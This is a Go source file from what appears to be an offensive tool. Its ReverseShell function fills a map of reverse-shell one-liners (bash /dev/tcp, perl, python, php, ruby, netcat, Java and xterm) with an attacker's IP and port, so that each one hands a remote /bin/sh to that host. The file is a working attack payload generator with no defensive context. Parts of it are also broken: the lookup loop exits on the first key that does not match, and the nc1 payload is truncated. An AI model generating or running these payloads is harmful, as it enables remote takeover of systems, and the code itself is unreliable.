package functions

import (
	"fmt"
	"log"
)

func ReverseShell(ip string, port string, language string) []string {
	var payload []string

	for k, i := range payloads {
		if k == language {
			switch k {
			case "python":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			case "perl":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			case "bash":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			case "php":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			//case "ruby":
			//payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			case "nc":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			case "nc1":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			case "java":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			case "xterm":
				payload = append(payload, fmt.Sprintf("[+]Payload -> "+i, ip, port))
			default:
				log.Fatalf("[!]No payload found in the database!")

			}
		} else {
			log.Fatalf("[!!]%v Not Supported! Exiting.\n", language)
		}

	}
	return payload
}

var payloads = map[string]string{
	"bash":   `bash -i >& /dev/tcp/%v/%v 0>&1`,
	"perl":   `perl -e 'use Socket;$i="%v";$p=%v;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};`,
	"python": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%v",%v));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
	"php":    `php -r '$sock=fsockopen("%v",%v);exec("/bin/sh -i <&3 >&3 2>&3");'`,
	"ruby":   `ruby -rsocket -e'f=TCPSocket.open("%v",%v).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
	"nc":     `nc -e /bin/sh %v %v`,
	"nc1":    `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %v %v >/tmp/`,
	"java": `r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%v/%v;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		p.waitFor()`,
	"xterm": `xterm -display %v:%v`,
}
